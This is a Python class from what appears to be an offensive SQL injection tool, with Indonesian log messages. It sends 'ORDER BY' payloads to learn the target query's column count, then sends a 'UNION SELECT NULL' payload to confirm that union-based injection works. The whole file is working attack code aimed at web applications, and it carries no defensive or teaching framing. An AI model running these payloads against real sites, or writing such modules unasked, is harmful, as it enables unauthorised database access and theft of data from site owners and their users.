class UnionBased:
    def __init__(self, req, parser, logger, args):
        self.req = req
        self.parser = parser
        self.logger = logger
        self.args = args
        self.cols = 0

    def run(self):
        self.cols = self._find_columns()
        if self.cols == 0:
            self.logger.info("Union-based tidak work")
            return
        self.logger.success(f"Kolom ditemukan: {self.cols}")
        self._extract()

    def _find_columns(self):
        for i in range(1, 21):
            payload = f"' ORDER BY {i}-- -"
            resp = self.req.get_text(payload)
            if "Unknown column" in resp or "error" in resp.lower():
                return i - 1
        return 0

    def _extract(self):
        nulls = ",".join(["NULL"] * self.cols)
        payload = f"' UNION SELECT {nulls}-- -"
        resp = self.req.get_text(payload)
        if resp:
            self.logger.success("Union-based work")
